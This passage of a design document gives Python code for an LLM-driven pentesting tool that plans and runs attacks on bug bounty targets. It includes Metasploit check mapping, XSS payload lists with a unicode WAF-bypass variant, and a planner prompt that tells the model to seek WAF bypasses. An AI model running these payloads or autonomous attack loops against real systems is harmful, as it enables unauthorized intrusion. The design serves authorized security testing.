For a web-focused bug bounty tool, the coverage gap that actually matters is much smaller — roughly 500-2,000 web-exploitable CVEs without nuclei templates.

#### 1.8.2 Path A — Metasploit Check Function Mapping

Metasploit's `check()` method probes without exploiting — it confirms whether a target is likely vulnerable:

```python
# core_engine/metasploit_checker.py

import asyncio
import json
from backend.shared.logging import get_logger

log = get_logger(__name__)

# Map CVE IDs to Metasploit module paths that have check() implemented
# This is a curated list — not all Metasploit modules implement check()
CVE_TO_MSF_MODULE: dict[str, str] = {
    "CVE-2021-44228": "exploit/multi/misc/log4shell_header_injection",
    "CVE-2021-45046": "exploit/multi/misc/log4shell_header_injection",
    "CVE-2020-1938":  "exploit/multi/http/apache_tomcat_ajp_file_read",
    "CVE-2019-0192":  "exploit/multi/misc/solr_log4j_rce",
    "CVE-2019-11581": "exploit/multi/http/atlassian_jira_template_injection",
    "CVE-2020-14179": "auxiliary/gather/jira_gather_emails",
    "CVE-2021-26084": "exploit/multi/http/confluence_widget_connector",
    # Add more as needed
}


async def check_with_metasploit(
    cve_id: str,
    target_url: str,
    timeout: int = 60,
) -> dict | None:
    """
    Run the Metasploit check() method for a specific CVE against a target.
    Returns result dict on vulnerable/likely vulnerable, None on safe/error.
    Requires msfconsole to be installed in the container.
    """
    module_path = CVE_TO_MSF_MODULE.get(cve_id)
    if not module_path:
        return None

    # Metasploit resource script — run check only, no exploit
    resource_script = f"""
use {module_path}
set RHOSTS {target_url}
set ConnectTimeout 10
check
exit
"""
    import tempfile, os
    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
        f.write(resource_script)
        rc_file = f.name

    try:
        proc = await asyncio.create_subprocess_exec(
            "msfconsole", "-q", "-r", rc_file, "-o", "/dev/stdout",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            log.warning("msf_check_timeout", cve=cve_id, target=target_url)
            return None

        output = stdout.decode(errors="replace")

        if "The target appears to be vulnerable" in output:
            return {"status": "vulnerable", "cve_id": cve_id, "output": output[:500]}
        elif "The target is not exploitable" in output:
            return None
        elif "The target appears to not be vulnerable" in output:
            return None
        # Ambiguous output — return for human review
        return {"status": "unknown", "cve_id": cve_id, "output": output[:500]}

    finally:
        os.unlink(rc_file)
```

#### 1.8.3 Path B — AI-Synthesized Detection (M10)

```python
# core_engine/ai_detection_synthesizer.py

from pydantic import BaseModel, Field
from typing import Literal
from backend.shared.logging import get_logger
import ollama

log = get_logger(__name__)


class SynthesizedDetection(BaseModel):
    """AI-generated detection approach for a CVE without a nuclei template."""
    cve_id: str
    method: Literal["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
    path: str
    headers: dict[str, str] = Field(default_factory=dict)
    body: str | None = None
    match_pattern: str
    match_type: Literal["contains", "regex", "status_code", "header_contains"]
    confidence: float = Field(ge=0.0, le=1.0)
    reasoning: str
    requires_auth: bool = False
    is_safe: bool = True      # AI must assert this is a safe probe


async def synthesize_detection_for_cve(
    cve_id: str,
    cve_description: str,
    affected_product: str,
    min_confidence: float = 0.7,
) -> SynthesizedDetection | None:
    """
    Ask the local LLM to generate a detection approach from the CVE description.
    Only used for CVEs with no nuclei template and no Metasploit check module.
    """
    schema = SynthesizedDetection.model_json_schema()

    try:
        response = ollama.chat(
            model="llama3.1:8b",
            messages=[
                {
                    "role": "system",
                    "content": (
                        "You are a security researcher who creates safe vulnerability detection probes. "
                        "Your probes must be safe — they detect vulnerability presence without causing damage. "
                        "A safe probe reads only non-sensitive data, uses only benign payloads, "
                        "and causes no side effects on the target system. "
                        "Respond ONLY with valid JSON matching the provided schema."
                    ),
                },
                {
                    "role": "user",
                    "content": f"""
CVE ID: {cve_id}
Affected Product: {affected_product}
Description: {cve_description}

Create a SAFE detection probe for this vulnerability. The probe must:
1. Be a single HTTP request
2. Use a benign payload that cannot cause damage
3. Have a clear indicator in the response confirming vulnerability
4. Have confidence >= {min_confidence} before responding

Schema to follow:
{schema}

If you cannot create a safe probe with confidence >= {min_confidence}, respond with:
{{"cve_id": "{cve_id}", "confidence": 0, "reasoning": "insufficient information"}}
""",
                },
            ],
            format=schema,
            options={"temperature": 0},
        )

        raw = response["message"]["content"]
        detection = SynthesizedDetection.model_validate_json(raw)

        if detection.confidence < min_confidence:
            log.info("ai_detection_low_confidence",
                     cve=cve_id, confidence=detection.confidence)
            return None

        if not detection.is_safe:
            log.warning("ai_detection_marked_unsafe", cve=cve_id)
            return None

        log.info("ai_detection_synthesized",
                 cve=cve_id, confidence=detection.confidence,
                 method=detection.method, path=detection.path)
        return detection

    except Exception as e:
        log.warning("ai_detection_synthesis_failed", cve=cve_id, error=str(e))
        return None
```

---

## Part 2 — Human-Like Multi-Layer Pentesting

### 2.1 The Architectural Shift: Fixed Pipeline vs Intelligence Loop

**Current AttackBot (fixed pipeline):**
```
Stage 0 → Stage 1 → Stage 2 → Stage 3 → (Stage 4 ∥ Stage 5) → Stage 6 → Stage 10
                   (this sequence always runs, in this order, regardless of what's found)
```

**Human pentester mental model:**
```
observe_current_state()
while not converged:
    hypothesis = reason_about_what_to_test_next(current_state)
    if hypothesis.confidence < threshold:
        break
    result = execute_test(hypothesis)
    current_state.update(result)
    if result.is_interesting:
        current_state.add_followup_hypotheses(result)
```

The intelligence loop replaces the rigid stage sequence with a dynamic observe-reason-act cycle. The baseline recon stages (1-3) still run first — they provide the foundation of knowledge the planner needs. After that, the planner takes over.

---

### 2.2 Supporting Data Structures

These must all be defined before the planner can be implemented:

```python
# core_engine/intelligence/models.py

from dataclasses import dataclass, field
from pydantic import BaseModel, Field
from typing import Literal
from uuid import UUID


# ── AttackPlan ─────────────────────────────────────────────────────────────

class AttackPlan(BaseModel):
    """
    A single planned action from the attack planner.
    The planner generates one of these per iteration of the intelligence loop.
    """
    reasoning: str = Field(
        description="Why this action is the most valuable next step given current findings"
    )
    action_type: str = Field(
        description=(
            "Which scanner/capability to invoke. One of: "
            "run_nuclei_cve | test_xss | test_sqli | test_cors | test_auth_bypass | "
            "test_idor | enumerate_hidden_endpoints | fuzz_parameter | "
            "test_jwt_manipulation | test_rate_limiting | analyze_js_endpoints | "
            "test_ssrf | test_file_upload | test_graphql | probe_admin_panel"
        )
    )
    target_asset: str = Field(description="The asset URL to target")
    target_endpoint: str | None = Field(
        default=None,
        description="Specific endpoint path if known, e.g. /api/v1/users"
    )
    target_parameter: str | None = Field(
        default=None,
        description="Specific parameter to test if known, e.g. 'q', 'id', 'redirect'"
    )
    specific_payload: str | None = Field(
        default=None,
        description="Specific payload to try if the planner has a concrete idea"
    )
    expected_outcome: str = Field(
        description="What response/behavior would confirm success"
    )
    fallback_if_blocked: str | None = Field(
        default=None,
        description="Alternative approach if primary is blocked by WAF or auth"
    )
    confidence: float = Field(
        ge=0.0, le=1.0,
        description="How confident the planner is this test will yield results"
    )
    follow_up_if_successful: list[str] = Field(
        default_factory=list,
        description="What to test next if this succeeds — enables chain building"
    )


# ── ActionResult ────────────────────────────────────────────────────────────

@dataclass
class ActionResult:
    """Result from executing an AttackPlan."""
    action_type: str
    target_asset: str
    target_endpoint: str | None
    new_findings: list  # list[FindingCandidate]
    new_endpoints_discovered: list[str]
    was_blocked: bool
    block_reason: str | None       # "waf_403" | "auth_required" | "rate_limited"
    interesting_response: str | None
    execution_time_ms: int
    follow_up_hints: list[str]     # things the executor noticed that the planner should know


# ── ChainResult ─────────────────────────────────────────────────────────────

@dataclass
class ChainResult:
    """Result from executing a multi-step AttackChainPlan."""
    success: bool
    failed_at_step: int | None = None
    failure_reason: str | None = None
    final_state: dict = field(default_factory=dict)
    new_findings: list = field(default_factory=list)  # list[FindingCandidate]
    evidence: list = field(default_factory=list)


# ── LessonSynthesis ─────────────────────────────────────────────────────────

class LessonSynthesis(BaseModel):
    """AI-synthesized lesson from a completed tactic outcome."""
    lesson: str = Field(description="One sentence describing what was learned")
    recommendation: str = Field(
        description="Concrete action to take next time this situation occurs"
    )
    avoid_if: str | None = Field(
        default=None,
        description="Condition under which this tactic should be skipped entirely. null if always applicable."
    )
    generalizable: bool = Field(
        default=True,
        description="Whether this lesson applies broadly or only to this specific target"
    )
```

---

### 2.3 Stage Executor — Translating Plans to Actions

The `StageExecutor` takes an `AttackPlan` and calls the appropriate scanning capability:

```python
# core_engine/intelligence/stage_executor.py

import asyncio
from backend.services.core_engine.intelligence.models import AttackPlan, ActionResult
from backend.services.core_engine.pipeline.context import ScanContext
from backend.services.core_engine.pipeline import web_vuln_tests, nuclei_scan
from backend.services.core_engine.pipeline.scope_filter import ScopeFilter
from backend.shared.logging import get_logger

log = get_logger("core_engine.stage_executor")


class StageExecutor:
    """
    Translates an AttackPlan into actual scanner calls.
    Each action_type maps to a specific scanning capability.
    New capabilities are added here as new action_types.
    """

    def __init__(self, config, scope_filter: ScopeFilter):
        self.config = config
        self.scope_filter = scope_filter

    async def execute(self, plan: AttackPlan, ctx: ScanContext) -> ActionResult:
        """Dispatch to the appropriate scanner based on action_type."""
        import time
        start_ms = int(time.time() * 1000)

        try:
            result = await self._dispatch(plan, ctx)
        except Exception as e:
            log.warning("executor_dispatch_failed",
                        action=plan.action_type, error=str(e))
            result = ActionResult(
                action_type=plan.action_type,
                target_asset=plan.target_asset,
                target_endpoint=plan.target_endpoint,
                new_findings=[],
                new_endpoints_discovered=[],
                was_blocked=False,
                block_reason=None,
                interesting_response=None,
                execution_time_ms=int(time.time() * 1000) - start_ms,
                follow_up_hints=[f"error: {str(e)}"],
            )

        result.execution_time_ms = int(time.time() * 1000) - start_ms
        return result

    async def _dispatch(self, plan: AttackPlan, ctx: ScanContext) -> ActionResult:
        action = plan.action_type

        if action == "run_nuclei_cve":
            return await self._run_nuclei_targeted(plan, ctx)
        elif action == "test_xss":
            return await self._test_xss_targeted(plan, ctx)
        elif action == "test_cors":
            return await self._test_cors_targeted(plan, ctx)
        elif action == "test_sqli":
            return await self._test_sqli_targeted(plan, ctx)
        elif action == "enumerate_hidden_endpoints":
            return await self._enumerate_hidden_endpoints(plan, ctx)
        elif action == "fuzz_parameter":
            return await self._fuzz_parameter(plan, ctx)
        elif action == "test_auth_bypass":
            return await self._test_auth_bypass(plan, ctx)
        elif action == "analyze_js_endpoints":
            return await self._analyze_js_for_endpoints(plan, ctx)
        elif action == "probe_admin_panel":
            return await self._probe_admin_panel(plan, ctx)
        elif action == "test_ssrf":
            return await self._test_ssrf_targeted(plan, ctx)
        elif action == "test_jwt_manipulation":
            return await self._test_jwt(plan, ctx)
        else:
            log.warning("unknown_action_type", action=action)
            return ActionResult(
                action_type=action, target_asset=plan.target_asset,
                target_endpoint=None, new_findings=[],
                new_endpoints_discovered=[], was_blocked=False,
                block_reason=None, interesting_response=None,
                execution_time_ms=0, follow_up_hints=[],
            )

    async def _run_nuclei_targeted(self, plan: AttackPlan, ctx: ScanContext) -> ActionResult:
        """Run nuclei with specific CVE template(s) against a single target."""
        from backend.services.core_engine.pipeline.nuclei_scan import _run_nuclei_for_asset
        from backend.services.core_engine.models import DiscoveredAsset

        # Find the asset in ctx
        asset_profile = ctx.asset_profiles.get(plan.target_asset)
        if not asset_profile:
            return ActionResult(action_type=plan.action_type,
                                target_asset=plan.target_asset,
                                target_endpoint=None, new_findings=[],
                                new_endpoints_discovered=[], was_blocked=False,
                                block_reason=None, interesting_response=None,
                                execution_time_ms=0, follow_up_hints=[])

        # Build a minimal DiscoveredAsset for the nuclei runner
        asset = DiscoveredAsset(
            asset_type=asset_profile.asset_type,
            value=plan.target_asset,
            technology_stack=asset_profile.technology_stack,
        )

        # Use the template map if available, else empty
        template_selection = ctx.asset_template_map.get(plan.target_asset)
        templates = template_selection.template_paths if template_selection else []

        findings = await _run_nuclei_for_asset(
            asset=asset,
            template_paths=templates,
            scope_filter=self.scope_filter,
            config=self.config,
        )
        return ActionResult(
            action_type=plan.action_type, target_asset=plan.target_asset,
            target_endpoint=plan.target_endpoint, new_findings=findings,
            new_endpoints_discovered=[], was_blocked=False, block_reason=None,
            interesting_response=None, execution_time_ms=0,
            follow_up_hints=[f"found {len(findings)} nuclei findings"],
        )

    async def _test_xss_targeted(self, plan: AttackPlan, ctx: ScanContext) -> ActionResult:
        """XSS test against a specific endpoint+parameter."""
        import httpx
        from backend.services.core_engine.models import DiscoveredEndpoint, FindingCandidate
        import uuid

        if not plan.target_endpoint:
            return self._empty_result(plan)

        full_url = plan.target_asset.rstrip("/") + plan.target_endpoint
        params = {plan.target_parameter: "test"} if plan.target_parameter else {}

        payloads = [
            plan.specific_payload,
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "';alert(1)//",
            f'"><img src=x onerror=\u0061lert(1)>',  # unicode bypass
        ]
        payloads = [p for p in payloads if p]  # remove None

        findings = []
        was_blocked = False

        async with httpx.AsyncClient(timeout=10.0, verify=False,
                                     follow_redirects=False) as client:
            for payload in payloads:
                test_params = {**params}
                if plan.target_parameter:
                    test_params[plan.target_parameter] = payload

                try:
                    resp = await client.get(full_url, params=test_params)
                    if resp.status_code == 403 and "cf-ray" in resp.headers:
                        was_blocked = True
                        break
                    if payload in resp.text:
                        findings.append(FindingCandidate(
                            vulnerability_type="reflected_xss",
                            title=f"Reflected XSS in {plan.target_parameter or 'parameter'}",
                            severity="high",
                            affected_url=full_url,
                            affected_parameter=plan.target_parameter,
                            payload=payload,
                            description=f"Reflected XSS confirmed via payload reflection",
                            source="attack_planner_xss",
                        ))
                        break
                except Exception:
                    continue

        return ActionResult(
            action_type=plan.action_type, target_asset=plan.target_asset,
            target_endpoint=plan.target_endpoint, new_findings=findings,
            new_endpoints_discovered=[], was_blocked=was_blocked,
            block_reason="waf_cloudflare" if was_blocked else None,
            interesting_response=None, execution_time_ms=0,
            follow_up_hints=["try unicode payload bypass" if was_blocked else ""],
        )

    def _empty_result(self, plan: AttackPlan) -> ActionResult:
        return ActionResult(
            action_type=plan.action_type, target_asset=plan.target_asset,
            target_endpoint=plan.target_endpoint, new_findings=[],
            new_endpoints_discovered=[], was_blocked=False, block_reason=None,
            interesting_response=None, execution_time_ms=0, follow_up_hints=[],
        )

    # Additional action handlers follow the same pattern:
    # _test_cors_targeted, _test_sqli_targeted, _enumerate_hidden_endpoints,
    # _fuzz_parameter, _test_auth_bypass, _analyze_js_for_endpoints,
    # _probe_admin_panel, _test_ssrf_targeted, _test_jwt — each calls
    # the appropriate scanner module with the plan's specific parameters
```

---

### 2.4 Asset Profile Helpers

```python
# core_engine/intelligence/profile_utils.py

from backend.services.core_engine.pipeline.context import ScanContext, AssetProfile
from backend.services.core_engine.models import ScanResult, DiscoveredAsset
from backend.services.core_engine.intelligence.models import ActionResult
from datetime import datetime, timezone


def build_asset_profiles(scan_result: ScanResult, ctx: ScanContext) -> list[AssetProfile]:
    """Build or update AssetProfile list from current scan state."""
    profiles = []
    for asset in scan_result.assets:
        asset_id = str(asset.asset_id) if asset.asset_id else asset.value
        profile = ctx.asset_profiles.get(asset_id) or AssetProfile(
            asset_id=asset_id,
            value=asset.value,
            asset_type=asset.asset_type,
            http_status=asset.http_status,
            technology_stack=asset.technology_stack or {},
            waf_detected=asset.waf_detected,
        )

        # Count findings for this asset
        profile.finding_count = sum(
            1 for f in scan_result.finding_candidates
            if asset.value in (f.affected_url or "")
        )

        # Count endpoints for this asset
        profile.endpoint_count = sum(
            1 for e in scan_result.endpoints
            if str(e.asset_id) == asset_id
        )

        # Detect API endpoints
        profile.has_api_endpoints = any(
            "/api/" in e.path or "/v1/" in e.path or "/graphql" in e.path
            for e in scan_result.endpoints
            if str(e.asset_id) == asset_id
        )

        profile.last_updated_at = datetime.now(timezone.utc).isoformat()
        ctx.asset_profiles[asset_id] = profile
        profiles.append(profile)

    return profiles


def update_asset_profiles_from_action(
    scan_result: ScanResult,
    result: ActionResult,
    ctx: ScanContext,
) -> None:
    """Update asset profiles after an action completes."""
    asset_id = result.target_asset
    if asset_id not in ctx.asset_profiles:
        return

    profile = ctx.asset_profiles[asset_id]
    profile.finding_count += len(result.new_findings)

    # Record what was tried to avoid repeating it
    if result.action_type not in profile.tested_payloads:
        profile.tested_payloads.append(result.action_type)

    # Update WAF info if we now know the asset is behind one
    if result.was_blocked and result.block_reason and not profile.waf_detected:
        profile.waf_detected = result.block_reason

    # Add newly discovered endpoints
    profile.endpoint_count += len(result.new_endpoints_discovered)
    profile.last_updated_at = datetime.now(timezone.utc).isoformat()


async def run_baseline_recon(
    ctx: ScanContext,
    scan_result: ScanResult,
    repo,
    config,
) -> None:
    """
    Always-run baseline stages that provide the foundation for the planner.
    These run sequentially before the intelligence loop begins.
    """
    from backend.services.core_engine.pipeline import (
        scope_filter as scope_filter_module,
        asset_discovery, fingerprinting, enumeration,
        cve_relevance_stage,
    )

    scope_filter = scope_filter_module.ScopeFilter(ctx.scope)

    # Stage 1 — Asset Discovery
    assets = await asset_discovery.run(ctx, scope_filter, config)
    scan_result.assets = assets
    await repo.save_assets(ctx.scan_id, assets)

    if not assets:
        return

    # Stage 2 — Fingerprinting
    scan_result.assets = await fingerprinting.run(ctx, scan_result.assets, config)

    # Stage 3 — Enumeration
    endpoints, js_assets = await enumeration.run(
        ctx, scan_result.assets, scope_filter, config
    )
    scan_result.endpoints = endpoints
    scan_result.js_assets = js_assets
    await repo.save_endpoints(ctx.scan_id, endpoints)

    # Stage 4b — CVE Relevance
    await cve_relevance_stage.run(ctx, scan_result.assets, config)

    # Build initial asset profiles
    build_asset_profiles(scan_result, ctx)
```

---

### 2.5 Attack Planner — Full Implementation

```python
# core_engine/intelligence/attack_planner.py

import json
from backend.services.core_engine.intelligence.models import AttackPlan
from backend.services.core_engine.pipeline.context import ScanContext, AssetProfile
from backend.services.core_engine.models import FindingCandidate
from backend.services.core_engine.intelligence.memory import MemoryReader
from backend.shared.logging import get_logger
import ollama

log = get_logger("core_engine.attack_planner")


class AttackPlanner:
    """
    The AI-driven attack planner. Uses an LLM to reason about what to test next
    given the current scan state, findings, and past experiences (memories).
    """

    MAX_PROMPT_TOKENS = 5000  # leave headroom for response

    def __init__(self, config, memory_reader: "MemoryReader"):
        self.config = config
        self.memory_reader = memory_reader

    async def plan_next_action(
        self,
        ctx: ScanContext,
        current_findings: list[FindingCandidate],
        asset_profiles: list[AssetProfile],
        completed_actions: list[str],
        failed_actions: dict[str, str],
    ) -> AttackPlan:
        """
        Generate the next AttackPlan based on current scan state.
        Returns a low-confidence plan (< 0.4) when there's nothing more to test.
        """

        # Fetch relevant memories to inject into the prompt
        memories = await self._fetch_relevant_memories(asset_profiles)

        prompt = self._build_planning_prompt(
            ctx=ctx,
            findings=current_findings,
            profiles=asset_profiles,
            completed=completed_actions,
            failed=failed_actions,
            memories=memories,
        )

        try:
            response = ollama.chat(
                model=self.config.planner_model,
                messages=[
                    {"role": "system", "content": self._system_prompt()},
                    {"role": "user", "content": prompt},
                ],
                format=AttackPlan.model_json_schema(),
                options={"temperature": 0},
            )
            raw = response["message"]["content"]
            # Strip markdown fences that occasionally leak through
            import re
            raw = re.sub(r"^```(?:json)?\s*|\s*```$", "", raw.strip())
            plan = AttackPlan.model_validate_json(raw)
            log.info("planner_generated_plan",
                     scan_id=ctx.scan_id,
                     action=plan.action_type,
                     target=plan.target_asset,
                     confidence=plan.confidence,
                     reasoning=plan.reasoning[:100])
            return plan

        except Exception as e:
            log.error("planner_failed", scan_id=ctx.scan_id, error=str(e))
            # Return a low-confidence plan to signal the loop should stop
            return AttackPlan(
                reasoning=f"Planner error: {str(e)}",
                action_type="none",
                target_asset="",
                expected_outcome="N/A",
                confidence=0.0,
            )

    def _system_prompt(self) -> str:
        return """You are a senior penetration tester with 15 years of experience in web application security.
You are analyzing a bug bounty target and deciding what to test next.

Your job is to reason like a human expert, not like an automated scanner.
Ask yourself: "Given what I know about this target, what is the one test most likely to reveal a real vulnerability?"

Rules:
- Be specific. Don't say "test for XSS". Say "test parameter 'callback' on /api/redirect with payload X because it appears to be reflected in the Location header".
- Consider attack chains. If you found a low-severity issue, think about what it enables next.
- Avoid repeating tests that were already completed.
- If a WAF blocked something, suggest a bypass technique — don't just give up.
- If confidence is below 0.4, say so and let the scan conclude.
- Respond ONLY with valid JSON matching the provided schema. No preamble."""

    def _build_planning_prompt(
        self,
        ctx: ScanContext,
        findings: list[FindingCandidate],
        profiles: list[AssetProfile],
        completed: list[str],
        failed: dict[str, str],
        memories: list,
    ) -> str:
        sections = []

        # Section 1 — Scan context
        sections.append(f"""SCAN CONTEXT:
Program: {ctx.program_id} on {getattr(ctx, 'platform', 'unknown')}
Scope: {', '.join(ctx.scope.in_scope[:5])}
Feature flags: {json.dumps({k: v for k, v in vars(ctx.feature_flags).items() if v})}""")

        # Section 2 — Asset profiles (budget: ~2000 tokens)
        asset_lines = []
        token_budget = 2000
        for p in sorted(profiles, key=lambda x: x.finding_count, reverse=True):
            line = (
                f"  {p.value} | status={p.http_status} | "
                f"waf={p.waf_detected or 'none'} | "
                f"tech={list(p.technology_stack.get('technologies', []))[:3]} | "
                f"endpoints={p.endpoint_count} | findings={p.finding_count} | "
                f"has_api={p.has_api_endpoints} | "
                f"tested={p.tested_payloads[:5]}"
            )
            token_budget -= len(line) // 4
            if token_budget < 500:
                break
            asset_lines.append(line)
        sections.append("DISCOVERED ASSETS:\n" + "\n".join(asset_lines))

        # Section 3 — Current findings (budget: ~1000 tokens)
        finding_lines = []
        for f in sorted(findings,
                        key=lambda x: {"critical":4,"high":3,"medium":2,"low":1,"info":0}.get(x.severity,0),
                        reverse=True)[:15]:
            line = f"  [{f.severity.upper()}] {f.vulnerability_type} on {f.affected_url}"
            if f.affected_parameter:
                line += f" (param: {f.affected_parameter})"
            finding_lines.append(line)
        sections.append("FINDINGS SO FAR:\n" + ("\n".join(finding_lines) or "  None yet"))

        # Section 4 — Completed and failed actions
        sections.append(f"COMPLETED ACTIONS: {', '.join(completed[-10:]) or 'none'}")
        if failed:
            sections.append(f"FAILED ACTIONS: {json.dumps(dict(list(failed.items())[:5]))}")

        # Section 5 — Relevant memories
        if memories:
            memory_lines = [
                f"  [{m.outcome.upper()}] {m.lesson} → {m.recommendation}"
                for m in memories[:8]
            ]
            sections.append("RELEVANT PAST EXPERIENCES:\n" + "\n".join(memory_lines))

        # Final instruction
        sections.append("""TASK:
As an expert pentester, what is the single most valuable next test to run?
Consider: attack chains enabled by current findings, untested high-value endpoints,
likely vulnerabilities given the tech stack, and WAF bypass techniques if needed.
Set confidence < 0.4 if there is nothing more valuable to test.""")

        return "\n\n".join(sections)

    async def _fetch_relevant_memories(self, profiles: list[AssetProfile]) -> list:
        """Fetch memories relevant to the current asset tech stacks."""
        all_tech = set()
        for p in profiles:
            for tech in p.technology_stack.get("technologies", []):
                all_tech.add(tech.lower().split("/")[0])  # strip versions

        if not all_tech:
            return []

        return await self.memory_reader.get_memories_for_tech_stack(
            list(all_tech), limit=10
        )
```

---

### 2.6 Multi-Step Attack Chain Executor — Full Implementation

```python
# core_engine/intelligence/chain_executor.py

import asyncio
import httpx
from dataclasses import dataclass, field
from backend.services.core_engine.intelligence.models import AttackChainPlan, AttackStep, ChainResult
from backend.services.core_engine.models import FindingCandidate
from backend.shared.logging import get_logger

log = get_logger("core_engine.chain_executor")


class ChainExecutor:
    """
    Executes multi-step attack chains where each step can depend on
    output from prior steps (e.g., extracted tokens, captured sessions).
    """

    def __init__(self, config, scope_filter):
        self.config = config
        self.scope_filter = scope_filter

    async def execute_chain(
        self,
        plan: "AttackChainPlan",
        ctx,
        session=None,
    ) -> ChainResult:
        state: dict = {}          # accumulated outputs keyed by step number
        new_findings: list = []

        log.info("chain_execution_started",
                 chain=plan.chain_name, step_count=len(plan.steps))

        for step in sorted(plan.steps, key=lambda s: s.step_number):
            # Verify all dependencies are satisfied
            for dep in step.depends_on:
                if f"step_{dep}" not in state:
                    return ChainResult(
                        success=False,
                        failed_at_step=step.step_number,
                        failure_reason=f"Dependency step_{dep} has no output",
                    )

            # Resolve input variables from prior step outputs
            resolved_inputs = self._resolve_inputs(step.input_from_steps, state)

            log.info("chain_step_executing",
                     chain=plan.chain_name, step=step.step_number,
                     description=step.description)

            try:
                output = await self._execute_step(step, resolved_inputs, session, plan.target_url)
                state[f"step_{step.step_number}"] = output

                if output.get("finding"):
                    new_findings.append(output["finding"])

                # Check success condition
                success = self._evaluate_condition(step.success_condition, output)

                if not success:
                    log.info("chain_step_condition_not_met",
                             step=step.step_number, condition=step.success_condition)
                    if step.on_failure == "abort_chain":
                        return ChainResult(
                            success=False,
                            failed_at_step=step.step_number,
                            failure_reason=f"Success condition not met: {step.success_condition}",
                            new_findings=new_findings,
                        )
                    elif step.on_failure == "try_fallback":
                        fallback_output = await self._try_fallback(step, resolved_inputs, session, plan)
                        state[f"step_{step.step_number}"] = fallback_output
                        if fallback_output.get("finding"):
                            new_findings.append(fallback_output["finding"])
                    # "continue" — proceed regardless

            except Exception as e:
                log.warning("chain_step_exception",
                            chain=plan.chain_name, step=step.step_number, error=str(e))
                if step.on_failure == "abort_chain":
                    return ChainResult(
                        success=False,
                        failed_at_step=step.step_number,
                        failure_reason=str(e),
                        new_findings=new_findings,
                    )

        return ChainResult(
            success=True,
            final_state=state,
            new_findings=new_findings,
        )

    def _resolve_inputs(
        self,
        input_map: dict[str, str],
        state: dict,
    ) -> dict:
        """
        Resolve input references like {"token": "step_2.csrf_token"}
        into actual values from prior step outputs.
        """
        resolved = {}
        for key, reference in input_map.items():
            parts = reference.split(".", 1)
            if len(parts) == 2:
                step_key, field_name = parts
                step_output = state.get(step_key, {})
                resolved[key] = step_output.get(field_name)
            else:
                resolved[key] = reference  # literal value
        return resolved

    def _evaluate_condition(self, condition: str, output: dict) -> bool:
        """
        Evaluate a success condition string against step output.
        Conditions are simple dot-notation checks.
        """
        if not condition:
            return True
        condition = condition.strip()

        # "response.status == 200"
        if "response.status ==" in condition:
            expected_status = int(condition.split("==")[1].strip())
            return output.get("response_status") == expected_status

        # "response.cookies contains 'session'"
        if "response.cookies contains" in condition:
            cookie_name = condition.split("contains")[1].strip().strip("'\"")
            cookies = output.get("response_cookies", {})
            return cookie_name in cookies

        # "response.body contains csrf_token pattern"
        if "response.body contains" in condition:
            pattern = condition.split("contains")[1].strip()
            body = output.get("response_body", "")
            return pattern.replace(" pattern", "") in body

        # Default: check if output has the referenced field and it's truthy
        return bool(output.get(condition))

    async def _execute_step(
        self,
        step: "AttackStep",
        inputs: dict,
        session,
        base_url: str,
    ) -> dict:
        """Execute a single chain step. Returns output dict."""
        action = step.action

        if action == "http_request":
            return await self._http_request_step(step, inputs, base_url)
        elif action == "browser_login":
            return await self._browser_login_step(step, inputs, base_url, session)
        elif action == "extract_token":
            return await self._extract_token_step(step, inputs)
        elif action == "submit_payload":
            return await self._submit_payload_step(step, inputs, base_url)
        else:
            log.warning("unknown_chain_action", action=action)
            return {}

    async def _http_request_step(self, step, inputs, base_url) -> dict:
        """Execute a direct HTTP request step."""
        url = base_url.rstrip("/") + (inputs.get("path") or step.description.split()[0] if "/" in step.description else "")
        headers = {}
        if inputs.get("cookie"):
            headers["Cookie"] = inputs["cookie"]
        if inputs.get("auth_token"):
            headers["Authorization"] = f"Bearer {inputs['auth_token']}"
        if inputs.get("csrf_token"):
            headers["X-CSRF-Token"] = inputs["csrf_token"]

        async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
            resp = await client.request(
                method=inputs.get("method", "GET"),
                url=url,
                headers=headers,
                json=inputs.get("body"),
                follow_redirects=False,
            )

        return {
            "response_status": resp.status_code,
            "response_body": resp.text[:2000],
            "response_headers": dict(resp.headers),
            "response_cookies": {k: v for k, v in resp.cookies.items()},
        }

    async def _browser_login_step(self, step, inputs, base_url, session) -> dict:
        """Use an existing browser session or create a new one."""
        if session:
            return {
                "session_cookie": session.cookie_string,
                "session_headers": session.headers,
            }
        # If no session available, return empty (chain will handle via on_failure)
        return {}

    async def _extract_token_step(self, step, inputs) -> dict:
        """Extract a token from prior step's response body."""
        import re
        body = inputs.get("response_body", "")

        # Common CSRF token patterns
        patterns = [
            r'csrf[-_]token["\s]*[:=]["\s]*([A-Za-z0-9_\-]{20,})',
            r'_token["\s]*:["\s]*"([A-Za-z0-9_\-]{20,})"',
            r'name="csrf"[^>]*value="([A-Za-z0-9_\-]{20,})"',
            r'<meta name="csrf-token" content="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                return {"csrf_token": match.group(1), "extracted": True}

        return {"csrf_token": None, "extracted": False}

    async def _try_fallback(self, step, inputs, session, plan) -> dict:
        """Attempt fallback action when primary step fails."""
        log.info("chain_step_fallback",
                 step=step.step_number, fallback=step.on_failure)
        # Fallback currently just returns empty state — specific fallbacks
        # would be defined per-step in future implementations
        return {}
```

---

### 2.7 Episodic Memory System — Full Implementation

#### 2.7.1 Memory Writer

```python
# core_engine/intelligence/memory.py

import hashlib
from uuid import uuid4
from datetime import datetime, timezone
from sqlalchemy import text
from backend.shared.db import get_session
from backend.services.core_engine.intelligence.models import LessonSynthesis
from backend.shared.logging import get_logger
import ollama

log = get_logger("core_engine.memory")


class MemoryWriter:
    """Writes tactic outcomes to the episodic memory database."""

    async def record_outcome(
        self,
        tactic_type: str,
        tech_stack: list[str],
        payload_used: str,
        endpoint_pattern: str,
        outcome: str,
        waf_response: str | None,
        success_indicator: str | None,
        program_type: str,
    ) -> None:
        """
        Record the outcome of a tactic. Either creates a new memory or
        reinforces an existing similar memory.
        """
        lesson = await self._synthesize_lesson(
            tactic_type=tactic_type,
            tech_stack=tech_stack,
            payload=payload_used,
            outcome=outcome,
            waf_response=waf_response,
        )

